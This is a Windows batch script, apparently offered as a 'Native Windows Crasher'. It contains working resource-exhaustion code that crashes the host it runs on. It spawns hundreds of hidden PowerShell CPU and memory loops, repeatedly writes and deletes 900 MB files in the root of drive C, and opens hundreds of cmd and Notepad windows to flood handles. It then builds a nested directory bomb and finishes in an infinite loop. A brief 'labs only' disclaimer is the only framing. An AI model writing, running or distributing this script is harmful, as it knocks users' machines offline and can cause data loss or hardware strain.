@echo off
setlocal ENABLEDELAYEDEXPANSION
title 0x0806 | 💀 Native Windows Crasher 💀
color 0C

:: CONFIG
set CPU_THREADS=250
set RAM_THREADS=150
set ZOMBIES=120
set HANDLE_FLOOD=500
set FILE_BOMBS=300
set FILE_SIZE=900000000
set DX_THREADS=20

echo [!!] FINAL WINDOWS STRESS/CRASH STARTING
echo [*] DO NOT USE OUTSIDE OF LABS. THIS WILL CRASH PHYSICAL HARDWARE.
timeout /t 5 >nul

:: ========== CPU ==========
echo [+] CPU OVERLOAD...
for /L %%i in (1,1,%CPU_THREADS%) do (
    start "" powershell -WindowStyle Hidden -Command "$x=1; while ($true) { $x *= 999999 }"
)

:: ========== RAM ==========
echo [+] RAM FLOOD...
for /L %%i in (1,1,%RAM_THREADS%) do (
    start "" powershell -WindowStyle Hidden -Command "$a='A'*1024*1024*500; while($true){$a+=$a.Substring(0,10000)}"
)

:: ========== DISK I/O ==========
echo [+] DISK WRITE/DELETE RACE...
for /L %%i in (1,1,40) do (
    start "" cmd /c ":loop && fsutil file createnew C:\crash%%i.tmp %FILE_SIZE% && del C:\crash%%i.tmp && goto loop"
)

:: ========== DX + GPU POLLING ==========
echo [+] GPU WMI/DX Stack Abuse...
for /L %%i in (1,1,%DX_THREADS%) do (
    start "" powershell -WindowStyle Hidden -Command "while ($true) { Get-WmiObject Win32_VideoController | Out-Null }"
)
start "" dxdiag /t %temp%\dxbomb.txt

:: ========== ZOMBIE CMD ==========
echo [+] Zombie CMD windows...
for /L %%i in (1,1,%ZOMBIES%) do (
    start "" cmd /k ":z && echo SYSTEM HANG %%i && goto z"
)

:: ========== HANDLE/GDI LIMIT ==========
echo [+] Window Handle Flood...
for /L %%i in (1,1,%HANDLE_FLOOD%) do (
    start "" notepad.exe
)

:: ========== NTFS TREE BOMB ==========
echo [+] Filesystem Tree Bomb...
set tpath=%temp%\tree_bomb
mkdir %tpath%
cd %tpath%
for /L %%i in (1,1,%FILE_BOMBS%) do (
    mkdir dir%%i
    cd dir%%i
    echo X > file%%i.txt
)

:: ========== HOLD ==========
echo [*] Letting system die... press power if locked.
:finalloop
goto finalloop
